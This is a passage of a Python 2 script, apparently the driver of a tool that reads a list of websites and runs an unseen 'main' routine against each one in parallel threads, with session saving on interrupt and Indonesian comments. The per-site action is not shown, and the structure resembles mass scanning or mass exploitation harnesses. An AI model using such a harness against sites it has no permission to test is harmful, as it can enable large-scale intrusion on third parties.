        tanya = raw_input("Want to contineu session ? [Y/n] ")
        if "Y" in tanya or "y" in tanya:
            lerr = open(lists).read().split("\n"+sessi)[1]
            readsplit = lerr.splitlines()
        else:
            kntl # Send Error Biar Lanjut Ke Wxception :v
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except:
            try:
                lists = raw_input("websitelist ? ")
                readsplit = open(lists).read().splitlines()
            except:
                print("Wrong input or list not found!")
                exit()
            try:
                numthread = raw_input("threads? : ")
            except:
                print("Wrong thread number!")
                exit()
    pool = ThreadPool(int(numthread))
    
    for url in readsplit:
        
        if "://" in url:
            url = url
        else:
            url = "http://"+url
        if url.endswith('/'):
            url = url[:-1]
        jagases = url
        try:
            pool.add_task(main, url)
        except KeyboardInterrupt:
            session = open(pid_restore, 'w')
            cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
            session.write(cfgsession)
            session.close()
            print("CTRL+C Detect, Session saved")
            exit()
    pool.wait_completion()
    try:
        os.remove(pid_restore)
    except:
        pass



